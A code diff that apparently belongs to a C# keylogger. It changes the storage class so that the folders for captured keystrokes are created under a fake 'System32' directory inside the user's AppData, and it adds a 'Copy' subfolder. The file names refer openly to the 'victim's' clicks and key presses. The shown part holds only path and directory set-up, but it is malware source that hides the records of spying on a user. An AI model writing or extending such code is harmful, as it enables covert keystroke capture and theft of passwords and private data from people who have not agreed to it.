@@ -3,9 +3,10 @@
     internal class Storage
     {
         private static string AppDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32";
-        public static string BaseKeylogFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\";
+        public static string BaseKeylogLogsFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\";
         private static string AllVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\AllClicks.txt";
         private static string OnlyKeyPressVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\OnlyKeyPressClicks.txt";
+        public static string KeyLogerCopyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLogger\\Copy\\";
         internal Storage()
         {
             // Ensure the directory exists
@@ -14,9 +15,13 @@
                 Directory.CreateDirectory(AppDataDirectory);
             }
             // Ensure the keylog file exists
-            if (!Directory.Exists(BaseKeylogFilePath))
+            if (!Directory.Exists(BaseKeylogLogsFilePath))
             {
-                Directory.CreateDirectory(BaseKeylogFilePath);
+                Directory.CreateDirectory(BaseKeylogLogsFilePath);
+            }
+            if(!Directory.Exists(KeyLogerCopyPath))
+            {
+                Directory.CreateDirectory(KeyLogerCopyPath);
             }
         }
 
